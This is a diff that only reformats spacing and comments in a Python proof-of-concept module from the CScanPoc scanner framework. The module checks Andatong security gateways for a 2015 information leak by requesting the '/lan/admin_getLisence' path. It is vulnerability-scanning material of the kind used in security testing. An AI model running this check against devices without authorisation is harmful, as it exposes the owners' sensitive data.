@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'ADTsec_0001'  # 平台漏洞编号，留空
     name = '安达通安全网关 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-08-04'  # 漏洞公布时间
     desc = '''
         “全网行为管理TPN-2G安全网关产品”和“SJW74系列安全网关” 存在一处敏感信息泄漏。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '安达通安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '020b2940-1bba-402d-a5c9-0c495e521ac4'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #info:http://www.wooyun.org/bugs/wooyun-2015-0131408
+            # info:http://www.wooyun.org/bugs/wooyun-2015-0131408
             hh = hackhttp.hackhttp()
             arg = self.target
             url = arg + '/lan/admin_getLisence'
@@ -48,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
